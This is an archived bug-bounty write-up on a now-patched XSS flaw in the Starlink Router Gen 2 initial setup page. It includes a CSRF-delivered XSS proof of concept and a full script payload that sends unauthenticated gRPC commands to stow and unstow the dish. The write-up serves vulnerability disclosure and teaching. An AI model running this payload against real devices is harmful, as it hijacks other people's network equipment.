# Starlink Router Gen 2 is vulnerable to XSS.

- **Source URL:** https://medium.com/@hackintoanetwork/starlink-router-gen-2-is-vulnerable-to-xss-48cfcadd0b13?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240105161832/https://medium.com/@hackintoanetwork/starlink-router-gen-2-is-vulnerable-to-xss-48cfcadd0b13
- **Fetched:** 2026-11-24
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/4720 (id 4720)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# 2023 Starlink Router Gen 2 XSS

--

# TL;DR

Through the XSS vulnerability present in the initial setup page of the second-generation router, an attacker can gain control of the Router and the Dishy.

# The Basics

- **Product :** Starlink Router Gen 2
- **Tested Version :** 2022.32.0
- **Bug-class** : XSS(Cross-Site Scripting)

# Overview of the Vulnerability

This vulnerability arises due to insufficient input filtering for the ssid and password parameters on the initial router setup page ([http://192.168.1.1/setup](http://192.168.1.1/setup)).

```
<html>
 <body>
  <h1>Proof of Concept</h1>
  <form id="PoC" method="POST" action="http://192.168.1.1/setup">
   <input type="hidden" name="ssid" value='" onfocus=javascript:alert(`XSS`); autofocus="'>
   <!-- <input type="hidden" name="password" value='" onfocus=javascript:alert(`XSS`); autofocus="'> -->
  </form>
  <script type="text/javascript">
   document.addEventListener("DOMContentLoaded", function() {
    document.getElementById("PoC").submit();
   });
  </script>
 </body>
<html>
```
This XSS vulnerability can be triggered in conjunction with a CSRF (Cross-Site Request Forgery) attack as shown in the above PoC (Proof of Concept).

# Exploit

Typically, the captive portal page should only be activated at the router’s internal address, 192.168.1.1. However, in older routers, there was a bug that unexpectedly allowed access to the captive portal page at Dishy’s internal address, 192.168.100.1.

- [http://192.168.1.1/setup](http://192.168.1.1/setup) → The captive portal page is displayed correctly.

- [http://192.168.100.1/setup](http://192.168.100.1/setup) → The captive portal page is also displayed at this address.

(Normally, access to the captive portal page should not be possible at Dishy’s internal address, 192.168.100.1.)

Using such a bug along with the Cross-Site Scripting (XSS) vulnerability allows for the circumvention of the browser’s Same-Origin Policy (SOP), enabling control over both the Router and Dishy.

Now, let’s examine through an example how this bug can be exploited to gain control of the Router and Dishy.

# Dishy Stow Request Analysis

When the ‘Stow’ command is issued from the administrator interface, the following HTTP Request is sent to ‘Dishy’.

(Note: The ‘Stow’ command allows the Dishy antenna to be folded for movement or storage.)

```
POST /SpaceX.API.Device.Device/Handle HTTP/1.1
Host: 192.168.100.1:9201
Content-Length: 8
x-grpc-web: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
content-type: application/grpc-web+proto
Accept: */*
Origin: http://dishy.starlink.com
Referer: http://dishy.starlink.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
�}
```
This Request’s header contains several important pieces of information.

## **x-grpc-web: 1**

- This indicates the use of the **gRPC-Web**
- (**gRPC-Web**

## **content-type: application/grpc-web+proto**

- It signifies that the data being transmitted uses the gRPC protocol and is encoded in the protobuf format.

## **Request Body**

`\x00\x00\x00\x00\x03\xef\xbf\xbd\x7d\x00`
- The request body contains data in the grpc-web+proto format, which likely holds the details of the Stow command.

Combining this information, when a user issues the Stow command through the administrator interface, this command is transmitted to the Dishy device using the gRPC protocol. (This will cause the Dishy device to fold into a more manageable state for movement.)

However, upon examining the Request, we can see that there is no authentication for the user sending this request.

This implies that someone other than the administrator could potentially send the same request to unauthorizedly control the **Dishy**

Nevertheless, this security flaw requires the attacker to have physical access to the local network, which limits the scope of the attack compared to those that can occur remotely.

# Possibility and Limitations of CSRF Attacks

This brings us to the question, “Can’t we just send the same request payload to perform a CSRF attack?”

While Cross-Site Request Forgery (CSRF) might be a possible scenario, such attacks are limited by the browser’s Same-Origin Policy (SOP).

gRPC requires a specific **content-type****application/grpc-web+proto**

However, the Same-Origin Policy (SOP) mandates that this header is stripped by the browser when sending requests from a different origin.

This restriction prevents external sources from sending gRPC requests to **Dishy**

# XSS Vulnerabilities as the Most Effective Way to Bypass SOP

Normally, the Same-Origin Policy (SOP) restricts web browsers from making requests to different origins.

However, by exploiting an XSS vulnerability, an attacker can execute scripts within the victim’s web browser.

These scripts are considered as originating from the same source (i.e., the website the victim is currently accessing).

As a result, the Same-Origin Policy (SOP) recognizes requests generated by these scripts as coming from the same origin, and thus the SOP restrictions do not apply in this case.

Therefore, in the case of CSRF attacks exploiting XSS vulnerabilities, especially for requests like gRPC that require a specific content-type header,

the attack script runs within the victim’s browser, treating it as a legitimate request, thus including the specific content-type header in the request.

# Exploit PoC (Proof of Concept)

Therefore, leveraging the XSS vulnerability and the previously mentioned bug, the Payload for sending a gRPC request to Dishy would be as follows:

```
<html>
 <body>
  <h1>Dishy Stow and Unstow</h1>
  <form id="PoC" method="POST" action="http://192.168.100.1/setup">
   <!-- <input type="hidden" name="ssid" value='" onfocus=javascript:alert(`XSS`); autofocus="'> -->
   <input type="hidden" name="password" value='"><script>for(let i=0;i<100;i++){setTimeout(()=>{var xhr=new XMLHttpRequest();xhr.open("POST","http://192.168.100.1:9201/SpaceX.API.Device.Device/Handle",true);xhr.setRequestHeader("x-grpc-web","1");xhr.setRequestHeader("Content-Type","application/grpc-web+proto");xhr.onreadystatechange=()=>{if(xhr.readyState==4&&xhr.status==200){console.log(xhr.responseText);}};xhr.send(new Uint8Array([0,0,0,0,3,146,125,0]).buffer);setTimeout(()=>{var xhr2=new XMLHttpRequest();xhr2.open("POST","http://192.168.100.1:9201/SpaceX.API.Device.Device/Handle",true);xhr2.setRequestHeader("x-grpc-web","1");xhr2.setRequestHeader("Content-Type","application/grpc-web+proto");xhr2.onreadystatechange=()=>{if(xhr2.readyState==4&&xhr2.status==200){console.log(xhr2.responseText);}};xhr2.send(new Uint8Array([0,0,0,0,5,146,125,2,8,1]).buffer);},1000);},i*2000);}</script><input type="hidden'/>
  </form>
  <script type="text/javascript">
   document.addEventListener("DOMContentLoaded", function() {
    document.getElementById("PoC").submit();
   });
  </script>
 </body>
<html>
```
This is a proof of concept code for Stow and Unstow Dishy.

# Demo

# CVE

# TimeLine

- 2023–10–10 : Vulnerability reported to SpaceX/Starlink
- 2023–10–12 : Recognized as a security vulnerability with a severity of Moderate
- 2023–11–01 : Patched in the latest release (The fix is in versions 2023.48.0 and up)

Next time, I will come back with a more interesting Starlink vulnerability
